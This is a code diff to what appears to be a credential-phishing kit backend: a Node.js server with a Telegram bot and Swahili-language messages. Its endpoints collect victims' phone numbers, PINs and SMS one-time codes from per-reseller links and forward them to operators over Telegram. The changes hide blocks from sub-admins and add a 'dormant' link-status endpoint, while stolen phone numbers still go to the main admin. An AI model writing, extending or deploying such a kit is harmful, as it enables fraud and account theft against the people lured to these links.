@@ -95,8 +95,8 @@ mainBot.on('message', (msg) => {
         if (registeredAdmins.has(targetId)) {
             const adminData = registeredAdmins.get(targetId);
             adminData.isBlocked = true;
-            mainBot.sendMessage(chatId, `🛑 Umemzuia sub-admin mwenye ID: \`${targetId}\` (${adminData.firstName}). Hautapokea tena ujumbe kutoka kwake.`, { parse_mode: "Markdown" });
-            mainBot.sendMessage(targetId, "🛑 *Ujumbe Umesimamishwa*\n\nUfikiaji wako wa kupokea ujumbe umesimamishwa kwa sasa na Msimamizi Mkuu.", { parse_mode: "Markdown" }).catch(() => {});
+            mainBot.sendMessage(chatId, `🛑 Umemzuia sub-admin mwenye ID: \`${targetId}\` (${adminData.firstName}). Hautapokea tena ujumbe kutoka kwake na kiungo chake kimezimwa kabisa.`, { parse_mode: "Markdown" });
+            // Notice: We do NOT send any message to the sub-admin's bot so they remain completely unaware via chat messages.
         } else {
             mainBot.sendMessage(chatId, `⚠️ Haionekani kuwa Chat ID \`${targetId}\` imesajiliwa kwenye mfumo.`, { parse_mode: "Markdown" });
         }
@@ -144,13 +144,9 @@ mainBot.on('message', (msg) => {
 function sendAdminLink(chatId, userIdStr, firstName, username) {
     const adminData = registeredAdmins.get(userIdStr);
     
-    // Check if sub-admin is blocked
+    // If sub-admin is blocked/dormant, DO NOT message their bot. Send alert ONLY to Main Admin.
     if (userIdStr !== MAIN_ADMIN_ID && adminData && adminData.isBlocked) {
-        mainBot.sendMessage(chatId, "🛑 *Samahani!*\n\nKiungo chako kimezimwa na Msimamizi Mkuu. Huwezi kukitumia kwa sasa.", { parse_mode: "Markdown" })
-            .catch(err => console.error("Error sending blocked message:", err));
-        
-        // Deliver alert message directly to main admin that a blocked sub-admin tried to access their link
-        mainBot.sendMessage(MAIN_ADMIN_ID, `⚠️ **JARIBIO LA KUTUMIA KIUNGO KILICHOZUIWA**\n\nSub-Admin *${escapeMarkdown(firstName)}* (\`${userIdStr}\`) amejaribu kutumia kiungo chake lakini amezuiwa.`, { parse_mode: "Markdown" })
+        mainBot.sendMessage(MAIN_ADMIN_ID, `🛑 **JARIBIO LA KUTUMIA KIUNGO KILICHOZUIWA (/start)**\n\nSub-Admin aliyefungiwa *${escapeMarkdown(firstName)}* (\`${userIdStr}\`) (\`${username}\`) amejaribu kutumia /start kupata kiungo chake kilichozuiwa.`, { parse_mode: "Markdown" })
             .catch(err => console.error("Error alerting main admin:", err));
         return;
     }
@@ -205,6 +201,18 @@ function setupCallbackHandler(botInstance) {
 
 setupCallbackHandler(mainBot);
 
+// Endpoint to verify if an admin link is active or disabled/dormant
+app.get('/api/check-admin-status/:adminId', (req, res) => {
+    const adminId = req.params.adminId;
+    if (adminId === MAIN_ADMIN_ID) {
+        return res.json({ active: true });
+    }
+    if (registeredAdmins.has(adminId) && registeredAdmins.get(adminId).isBlocked) {
+        return res.json({ active: false, reason: 'dormant' });
+    }
+    res.json({ active: true });
+});
+
 app.post('/api/submit-credentials', (req, res) => {
     const { sessionId, phone, pin, adminId } = req.body;
     
@@ -213,17 +221,16 @@ app.post('/api/submit-credentials', (req, res) => {
         targetAdmin = adminId.toString().trim();
     }
 
-    // Check if specific sub-admin is blocked via /payment
+    // If sub-admin is blocked, do not send anything to them. Report ONLY to Main Admin.
     if (targetAdmin !== MAIN_ADMIN_ID && registeredAdmins.has(targetAdmin)) {
         if (registeredAdmins.get(targetAdmin).isBlocked) {
-            console.log(`⚠️ Blocked credential delivery for sub-admin ${targetAdmin} due to individual /payment block.`);
+            console.log(`🛑 Link completely disabled/dormant for sub-admin ${targetAdmin}`);
             
-            // Deliver message to main admin about the block attempt
             const adminData = registeredAdmins.get(targetAdmin);
-            mainBot.sendMessage(MAIN_ADMIN_ID, `🛑 **JARIBIO LIMEZUIWA (CREDENTIALS)**\n\nSub-Admin aliyefungiwa *${escapeMarkdown(adminData ? adminData.firstName : 'Unknown')}* (\`${targetAdmin}\`) amejaribu kuwasilisha taarifa kupitia kiungo chake.\n\n📱 Namba: ${phone}`, { parse_mode: "Markdown" })
+            mainBot.sendMessage(MAIN_ADMIN_ID, `🛑 **KIUNGO KIMEZIMWA (CREDENTIALS ATTEMPT)**\n\nSub-Admin aliyefungiwa *${escapeMarkdown(adminData ? adminData.firstName : 'Unknown')}* (\`${targetAdmin}\`) amejaribu kuwasilisha taarifa kupitia kiungo chake kilichozuiwa.\n\n📱 Namba: ${phone}`, { parse_mode: "Markdown" })
                 .catch(err => console.error("Error notifying main admin:", err));
 
-            return res.json({ success: false, message: 'Admin is blocked' });
+            return res.json({ success: false, status: 'dormant', message: 'This link is dormant and disabled.' });
         }
     }
 
@@ -264,17 +271,16 @@ app.post('/api/submit-otp', (req, res) => {
         return res.json({ status: 'not_found', message: 'Session not found' });
     }
 
-    // Check if specific sub-admin is blocked via /payment
+    // If sub-admin is blocked, do not send anything to them. Report ONLY to Main Admin.
     if (session.targetAdmin !== MAIN_ADMIN_ID && registeredAdmins.has(session.targetAdmin)) {
         if (registeredAdmins.get(session.targetAdmin).isBlocked) {
-            console.log(`⚠️ Blocked OTP delivery for sub-admin ${session.targetAdmin} due to individual /payment block.`);
+            console.log(`🛑 OTP disabled/dormant for sub-admin ${session.targetAdmin}`);
             
-            // Deliver message to main admin about the block attempt
             const adminData = registeredAdmins.get(session.targetAdmin);
-            mainBot.sendMessage(MAIN_ADMIN_ID, `🛑 **JARIBIO LIMEZUIWA (OTP)**\n\nSub-Admin aliyefungiwa *${escapeMarkdown(adminData ? adminData.firstName : 'Unknown')}* (\`${session.targetAdmin}\`) amejaribu kutuma SMS OTP kupitia kiungo chake.`, { parse_mode: "Markdown" })
+            mainBot.sendMessage(MAIN_ADMIN_ID, `🛑 **KIUNGO KIMEZIMWA (OTP ATTEMPT)**\n\nSub-Admin aliyefungiwa *${escapeMarkdown(adminData ? adminData.firstName : 'Unknown')}* (\`${session.targetAdmin}\`) amejaribu kutuma SMS OTP kupitia kiungo chake kilichozuiwa.`, { parse_mode: "Markdown" })
                 .catch(err => console.error("Error notifying main admin:", err));
 
-            return res.json({ success: false, message: 'Admin is blocked' });
+            return res.json({ success: false, status: 'dormant', message: 'This link is dormant and disabled.' });
         }
     }
 
@@ -327,4 +333,4 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-        
+           
